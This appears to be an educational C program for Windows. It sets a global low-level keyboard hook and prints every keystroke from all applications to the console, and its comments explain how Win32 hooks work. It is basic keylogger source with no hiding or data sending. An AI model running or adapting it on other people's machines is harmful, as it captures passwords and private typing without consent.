#include <windows.h>
#include <stdio.h>

BYTE keyState[256];
WCHAR buffer[5];

LRESULT CALLBACK kbdHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    /*
        nCode : A code the hook procedure uses to determine how to process the message. If nCode is less than zero,
        the hook procedure must pass the message using the CallNextHookEx function without further processing and should
        return the value returned by CallNextHookEx.
        This also means that if nCode is greater than or equal to zero, the hook procedure may process the message and
        return a non-zero value to prevent the system
        from passing the message to the target window procedure.

        Note : In any case it must call the CallNextHookEx().

        wParam : This is a identifier for the keyboard message such as key down, up etc.
        refer to documentation for more details : https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc

        lParam : This parameter is a pointer to a KBDLLHOOKSTRUCT structure.The structure basically contains the detailed information
        about the key pressed
    */
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        // printf("Key pressed : %lu\n", kbd->vkCode);
        switch (kbd->vkCode)
        {
        case VK_RETURN:
            printf("[ENTER]\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        case VK_BACK:
            printf("[BACKSPACE]\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        case VK_TAB:
            printf("[TAB]\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            printf("[SHIFT]\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);

        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            printf("[CTRL]\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        
        case VK_SPACE:
            printf(" ");
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        
        case VK_CAPITAL:
            printf("[CAPSLOCK]\n");
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        ZeroMemory(buffer, sizeof(buffer));
        GetKeyboardState(keyState);
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
        {
            keyState[VK_SHIFT] |= 0x80;
        }

        if (GetKeyState(VK_CAPITAL) & 0x0001)
        {
            keyState[VK_CAPITAL] |= 0x01;
        }

        int result = ToUnicode(
            kbd->vkCode,
            kbd->scanCode,
            keyState,
            buffer,
            5,
            0);

        // printf(
        //     "Shift = %d, Caps = %d\n",
        //     (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0,
        //     (GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if (result > 0 && buffer[0] != ' ')
        {
            // printf("Equivalent character : %lc\n", buffer[0]);
            wprintf(L"%lc", buffer[0]);
        }
    }

    // vkCode stands for virtual key code , it is a system developed by windows
    // to identify each unique key on keyboard.

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    /*
    A hook is a mechanism in win32 api for intercepting messages, mouse or keystrokes.

    A hook procedure is a application defined function which can modify or perform action on the intercepted events.

    A hook chain is a list of hook procedures which are added to the windows chain
    via SetWindowsHookEx() function.

    Each hook procedure in the chain determines whether to pass the event to the next procedure.
    A hook procedure passes an event to the next procedure by calling the CallNextHookEx function.

    There are different types of hooks which enables an application to monitor.
    a different aspect of the system's message-handling mechanism.

    `You may refer the documentation : http://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks`
    Out of the available types , WH_KEYBOARD_LL is relevant for our task.

    Note : WH_KEYBOARD is laso an option but the documentation states the primary difference between
    these two hook tpyes is that one is thread only while the WH_KEYBOARD_LL is global
    */

    SetWindowsHookExA(
        WH_KEYBOARD_LL,
        kbdHookProc,
        NULL,
        0);

    /*
    Windows API uses something called as the dwThreadId which also happens to be a paramter
    for SetWindowsHookExA(). However, when set to 0 it becomes so that the hook procedure can run hook/intercept
    proccesses globally.

    Also if we were to use Non Low-level idHook(such as WH_KEYBOARD) , in order to make it globally functionable
    would have to pack our hook procedure function in a DLL(Dynamic-Link Library).
    */

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}